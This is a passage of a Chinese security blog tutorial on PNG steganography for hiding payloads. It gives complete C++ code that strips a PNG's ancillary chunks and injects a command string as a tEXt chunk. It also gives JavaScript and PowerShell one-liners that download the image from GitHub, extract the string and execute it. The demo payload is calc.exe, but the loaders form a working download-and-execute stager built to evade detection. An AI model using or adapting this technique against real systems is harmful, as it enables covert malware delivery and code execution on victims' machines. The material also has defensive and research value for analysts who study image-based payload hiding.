class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned int GetCrc32(unsigned char* InStr,unsigned int len)&#123;        </span><br><span class="line">	unsigned int Crc32Table[256];      </span><br><span class="line">	unsigned int i,j;        </span><br><span class="line">	unsigned int Crc;        </span><br><span class="line">	for (i = 0; i &lt; 256; i++)&#123;        </span><br><span class="line">		Crc = i;        </span><br><span class="line">		for (j = 0; j &lt; 8; j++)&#123;        </span><br><span class="line">			if (Crc &amp; 1)        </span><br><span class="line">				Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        </span><br><span class="line">			else       </span><br><span class="line">				Crc &gt;&gt;= 1;      </span><br><span class="line">		&#125;        </span><br><span class="line">		Crc32Table[i] = Crc;        </span><br><span class="line">	&#125;        </span><br><span class="line">	</span><br><span class="line">	Crc=0xffffffff;        </span><br><span class="line">	for(unsigned int m=0; m&lt;len; m++)&#123;          </span><br><span class="line">		Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        </span><br><span class="line">	&#125;     </span><br><span class="line">	</span><br><span class="line">	Crc ^= 0xFFFFFFFF;     </span><br><span class="line">	return Crc;        </span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	FILE *fp,*fpnew;   </span><br><span class="line">	unsigned char *buf=NULL;</span><br><span class="line">	unsigned int len=0;</span><br><span class="line">	unsigned int ChunkLen=0;</span><br><span class="line">	unsigned int ChunkCRC32=0;</span><br><span class="line">	unsigned int ChunkOffset=0;	</span><br><span class="line">	unsigned int crc32=0;</span><br><span class="line">	unsigned int i=0,j=0;</span><br><span class="line">	unsigned char Signature[8]=&#123;0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a&#125;;	</span><br><span class="line">	unsigned char IEND[12]=&#123;0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82&#125;;	   </span><br><span class="line">	</span><br><span class="line">	if((fp=fopen(&quot;c:\\test\\0.png&quot;,&quot;rb+&quot;))==NULL)</span><br><span class="line">		return 0;  </span><br><span class="line">	if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL)</span><br><span class="line">		return 0;  </span><br><span class="line">	fseek(fp,0,SEEK_END);</span><br><span class="line">	len=ftell(fp);</span><br><span class="line">	buf=new unsigned char[len];</span><br><span class="line">	fseek(fp,0,SEEK_SET);</span><br><span class="line">	fread(buf,len,1,fp);</span><br><span class="line">	printf(&quot;Total Len=%d\n&quot;,len);</span><br><span class="line">	printf(&quot;----------------------------------------------------\n&quot;);</span><br><span class="line">	fseek(fp,8,SEEK_SET);</span><br><span class="line">	ChunkOffset=8;</span><br><span class="line">	i=0; </span><br><span class="line">	fwrite(Signature,8,1,fpnew);</span><br><span class="line">	while(1)</span><br><span class="line">	&#123;</span><br><span class="line">		i++;</span><br><span class="line">		j=0;</span><br><span class="line">		memset(buf,0,len);</span><br><span class="line">		fread(buf,4,1,fp);</span><br><span class="line">		fwrite(buf,4,1,fpnew);</span><br><span class="line">		ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];</span><br><span class="line">		fread(buf,4+ChunkLen,1,fp);</span><br><span class="line">		printf(&quot;[+]ChunkName:%c%c%c%c		&quot;,buf[0],buf[1],buf[2],buf[3]);</span><br><span class="line">		if(strncmp((char *)buf,&quot;IHDR&quot;,4)==0|strncmp((char *)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)</span><br><span class="line">		&#123;	</span><br><span class="line">			printf(&quot;Palette Chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">			fwrite(buf,4+ChunkLen,1,fpnew);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;Ancillary Chunk\n&quot;);</span><br><span class="line">			fseek(fpnew,-4,SEEK_CUR);</span><br><span class="line">			j=1;</span><br><span class="line">		&#125;</span><br><span class="line">		printf(&quot;   ChunkOffset:0x%08x	\n&quot;,ChunkOffset);</span><br><span class="line">		printf(&quot;   ChunkLen: %10d		\n&quot;,ChunkLen);</span><br><span class="line">		crc32=GetCrc32(buf,ChunkLen+4);</span><br><span class="line">		printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);</span><br><span class="line">		fread(buf,4,1,fp);</span><br><span class="line">		ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];</span><br><span class="line">		printf(&quot;   ChunkCRC32: %08X		&quot;,ChunkCRC32);</span><br><span class="line">		if(crc32!=ChunkCRC32)</span><br><span class="line">			printf(&quot;[!]CRC32Check Error!\n&quot;);</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;Check Success!\n\n&quot;);</span><br><span class="line">			if(j==0)</span><br><span class="line">				fwrite(buf,4,1,fpnew);</span><br><span class="line">		&#125;</span><br><span class="line">		ChunkLen=ftell(fp);</span><br><span class="line">		if(ChunkLen==(len-12))</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;\n----------------------------------------------------\n&quot;);</span><br><span class="line">			printf(&quot;Total Chunk:%d\n&quot;,i);		</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite(IEND,12,1,fpnew);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	fclose(fpnew);</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如图，左边为原始PNG文件大小，右边为去掉所有辅助数据块后的文件，仍然可以正常浏览</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-10.png" alt="Alt text"></p>
+<h2 id="0x06-写入Payload"><a href="#0x06-写入Payload" class="headerlink" title="0x06 写入Payload"></a>0x06 写入Payload</h2><hr>
+<p><strong>实例：</strong></p>
+<p>按照辅助数据块的格式写入Payload</p>
+<p>写入的Payload为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.exe</span><br></pre></td></tr></table></figure>
+
+<p>辅助数据块设置为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tEXt</span><br></pre></td></tr></table></figure>
+
+<p>对应的完整数据块结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Length:				00 00 00 08</span><br><span class="line">Chunk Type Code：	74 45 58 74</span><br><span class="line">Chunk Data：			63 61 6c 63 2e 65 78 65</span><br><span class="line">CRC：				fa c4 08 76</span><br></pre></td></tr></table></figure>
+
+<p>写入的十六进制数据如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 08 74 45 58 74 63 61 6c 63 2e 65 78 65 fa c4 08 76</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：</strong> 本实例仅作演示，实际使用可换成其他数据块，更加隐蔽</p>
+<h3 id="1、工具实现-1"><a href="#1、工具实现-1" class="headerlink" title="1、工具实现"></a>1、工具实现</h3><p>使用<code>Hex Editor</code>插入数据，如图</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-11.PNG" alt="Alt text"></p>
+<p>保存后，不影响PNG文件浏览</p>
+<h3 id="2、程序实现-1"><a href="#2、程序实现-1" class="headerlink" title="2、程序实现"></a>2、程序实现</h3><p>去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt</p>
+<p>保存为addpayload.cpp,完整代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned int GetCrc32(unsigned char* InStr,unsigned int len)&#123;        </span><br><span class="line">	unsigned int Crc32Table[256];      </span><br><span class="line">	unsigned int i,j;        </span><br><span class="line">	unsigned int Crc;        </span><br><span class="line">	for (i = 0; i &lt; 256; i++)&#123;        </span><br><span class="line">		Crc = i;        </span><br><span class="line">		for (j = 0; j &lt; 8; j++)&#123;        </span><br><span class="line">			if (Crc &amp; 1)        </span><br><span class="line">				Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        </span><br><span class="line">			else       </span><br><span class="line">				Crc &gt;&gt;= 1;      </span><br><span class="line">		&#125;        </span><br><span class="line">		Crc32Table[i] = Crc;        </span><br><span class="line">	&#125;        </span><br><span class="line">	</span><br><span class="line">	Crc=0xffffffff;        </span><br><span class="line">	for(unsigned int m=0; m&lt;len; m++)&#123;          </span><br><span class="line">		Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        </span><br><span class="line">	&#125;     </span><br><span class="line">	</span><br><span class="line">	Crc ^= 0xFFFFFFFF;     </span><br><span class="line">	return Crc;        </span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line">void convertStrToUnChar(char* str, unsigned char* UnChar)  </span><br><span class="line">&#123;  </span><br><span class="line">	int i = strlen(str), j = 0, counter = 0;  </span><br><span class="line">	char c[2];  </span><br><span class="line">	unsigned int bytes[2];  </span><br><span class="line">  </span><br><span class="line">	for (j = 0; j &lt; i; j += 2)   </span><br><span class="line">	&#123;  </span><br><span class="line">		if(0 == j % 2)  </span><br><span class="line">		&#123;  </span><br><span class="line">			c[0] = str[j];  </span><br><span class="line">			c[1] = str[j + 1];  </span><br><span class="line">			sscanf(c, &quot;%02x&quot; , &amp;bytes[0]);  </span><br><span class="line">			UnChar[counter] = bytes[0];  </span><br><span class="line">			counter++;  </span><br><span class="line">		&#125;  </span><br><span class="line">	&#125;  </span><br><span class="line">	return;  </span><br><span class="line">&#125;     </span><br><span class="line"></span><br><span class="line">void AddPayload(FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">	char *Payload=&quot;calc.exe&quot;;</span><br><span class="line">	unsigned char *buf;</span><br><span class="line">	int len;</span><br><span class="line">	int crc32;</span><br><span class="line">	len=strlen(Payload);	</span><br><span class="line">	buf=new unsigned char[len+12];</span><br><span class="line">	buf[0]=len&gt;&gt;24&amp;0xff;</span><br><span class="line">	buf[1]=len&gt;&gt;16&amp;0xff;</span><br><span class="line">	buf[2]=len&gt;&gt;8&amp;0xff;</span><br><span class="line">	buf[3]=len&amp;0xff;</span><br><span class="line">	buf[4]=&#x27;t&#x27;;</span><br><span class="line">	buf[5]=&#x27;E&#x27;;</span><br><span class="line">	buf[6]=&#x27;X&#x27;;</span><br><span class="line">	buf[7]=&#x27;t&#x27;;</span><br><span class="line">	for(int j=0;j&lt;len;j++)</span><br><span class="line">		buf[j+8]=Payload[j];</span><br><span class="line">	buf[len+8]=0XFA;</span><br><span class="line">	buf[len+9]=0XC4;</span><br><span class="line">	buf[len+10]=0X08;</span><br><span class="line">	buf[len+11]=0X76;</span><br><span class="line">	fwrite(buf,len+12,1,fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	FILE *fp,*fpnew;   </span><br><span class="line">	unsigned char *buf=NULL;</span><br><span class="line">	unsigned int len=0;</span><br><span class="line">	unsigned int ChunkLen=0;</span><br><span class="line">	unsigned int ChunkCRC32=0;</span><br><span class="line">	unsigned int ChunkOffset=0;	</span><br><span class="line">	unsigned int crc32=0;</span><br><span class="line">	unsigned int i=0,j=0;</span><br><span class="line">	unsigned char Signature[8]=&#123;0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a&#125;;	</span><br><span class="line">	unsigned char IEND[12]=&#123;0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82&#125;;	   </span><br><span class="line">	</span><br><span class="line">	if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)</span><br><span class="line">		return 0;  </span><br><span class="line">	if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL)</span><br><span class="line">		return 0;  </span><br><span class="line">	fseek(fp,0,SEEK_END);</span><br><span class="line">	len=ftell(fp);</span><br><span class="line">	buf=new unsigned char[len];</span><br><span class="line">	fseek(fp,0,SEEK_SET);</span><br><span class="line">	fread(buf,len,1,fp);</span><br><span class="line">	printf(&quot;Total Len=%d\n&quot;,len);</span><br><span class="line">	printf(&quot;----------------------------------------------------\n&quot;);</span><br><span class="line">	fseek(fp,8,SEEK_SET);</span><br><span class="line">	ChunkOffset=8;</span><br><span class="line">	i=0; </span><br><span class="line">	fwrite(Signature,8,1,fpnew);</span><br><span class="line">	while(1)</span><br><span class="line">	&#123;</span><br><span class="line">		i++;</span><br><span class="line">		j=0;</span><br><span class="line">		memset(buf,0,len);</span><br><span class="line">		fread(buf,4,1,fp);</span><br><span class="line">		fwrite(buf,4,1,fpnew);</span><br><span class="line">		ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];</span><br><span class="line">		fread(buf,4+ChunkLen,1,fp);</span><br><span class="line">		printf(&quot;[+]ChunkName:%c%c%c%c		&quot;,buf[0],buf[1],buf[2],buf[3]);</span><br><span class="line">		if(strncmp((char *)buf,&quot;IHDR&quot;,4)==0|strncmp((char *)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)</span><br><span class="line">		&#123;	</span><br><span class="line">			printf(&quot;Palette Chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">			fwrite(buf,4+ChunkLen,1,fpnew);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;Ancillary Chunk\n&quot;);</span><br><span class="line">			fseek(fpnew,-4,SEEK_CUR);</span><br><span class="line">			j=1;</span><br><span class="line">		&#125;</span><br><span class="line">		printf(&quot;   ChunkOffset:0x%08x	\n&quot;,ChunkOffset);</span><br><span class="line">		printf(&quot;   ChunkLen: %10d		\n&quot;,ChunkLen);</span><br><span class="line">		crc32=GetCrc32(buf,ChunkLen+4);</span><br><span class="line">		printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);</span><br><span class="line">		fread(buf,4,1,fp);</span><br><span class="line">		ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];</span><br><span class="line">		printf(&quot;   ChunkCRC32: %08X		&quot;,ChunkCRC32);</span><br><span class="line">		if(crc32!=ChunkCRC32)</span><br><span class="line">			printf(&quot;[!]CRC32Check Error!\n&quot;);</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;Check Success!\n\n&quot;);</span><br><span class="line">			if(j==0)</span><br><span class="line">				fwrite(buf,4,1,fpnew);</span><br><span class="line">		&#125;</span><br><span class="line">		ChunkLen=ftell(fp);</span><br><span class="line">		if(ChunkLen==(len-12))</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;\n----------------------------------------------------\n&quot;);</span><br><span class="line">			printf(&quot;Total Chunk:%d\n&quot;,i);		</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	AddPayload(fpnew);</span><br><span class="line">	fwrite(IEND,12,1,fpnew);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	fclose(fpnew);</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用check.cpp对其进行校验，如图，校验成功</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-12.PNG" alt="Alt text"></p>
+<h2 id="0x07-读取payload并执行"><a href="#0x07-读取payload并执行" class="headerlink" title="0x07 读取payload并执行"></a>0x07 读取payload并执行</h2><hr>
+<p>将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：</p>
+<h3 id="1、javascript"><a href="#1、javascript" class="headerlink" title="1、javascript"></a>1、javascript</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">h = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">h.SetTimeouts(0, 0, 0, 0);</span><br><span class="line">h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png&quot;,false);</span><br><span class="line">h.Send();</span><br><span class="line">Data = h.ResponseText;</span><br><span class="line">x=Data.indexOf(&quot;tEXt&quot;);</span><br><span class="line">y=Data.indexOf(&quot;IEND&quot;);</span><br><span class="line">str=Data.substring(x+4,y-8);</span><br><span class="line">new ActiveXObject(&quot;WScript.Shell&quot;).Run(str); </span><br></pre></td></tr></table></figure>
+
+<h3 id="2、powershell"><a href="#2、powershell" class="headerlink" title="2、powershell"></a>2、powershell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$url = &#x27;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png&#x27;</span><br><span class="line">$request = New-Object System.Net.WebCLient</span><br><span class="line">$bytes = $request.DownloadString($url)</span><br><span class="line">$x=$bytes.indexof(&quot;tEXt&quot;)</span><br><span class="line">$y=$bytes.indexof(&quot;IEND&quot;)</span><br><span class="line">$str=$bytes.Substring($x+4,$y-$x-12)</span><br><span class="line">Start-Process -FilePath $str</span><br></pre></td></tr></table></figure>
+
+<p><strong>注:</strong></p>
+<p>这里给出两种方法，仅作演示</p>
+<h2 id="0x08-小结"><a href="#0x08-小结" class="headerlink" title="0x08 小结"></a>0x08 小结</h2><hr>
+<p>本文详细介绍分析了PNG文件的格式，编写程序实现以下功能：</p>
+<ul>
+<li>自动解析PNG文件格式，辅助查找其中的隐藏内容</li>
+<li>添加Payload</li>
+<li>下载PNG图片解析并执行payload</li>
+</ul>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/MOM - 蜡笔小心.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/犯错  - 小眼鑫.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/非酋 (王柏鸿 Remix) - 薛明媛.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/黑咻狂想曲（Cover：艾索） - 玖肆仟.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/忽而今夏（Cover：汪苏泷） - 耳朵玥.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/星茶会 - 灰澈.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/坠落星空 - 小星星Aurora.mp3"></li>
+                        
+                    
+                        
+                            <li title="7" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/最甜情歌 (女生版)  - 一玟.mp3"></li>
+                        
+                    
+                        
+                            <li title="8" data-url="https://api.uomg.com/api/rand.music"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
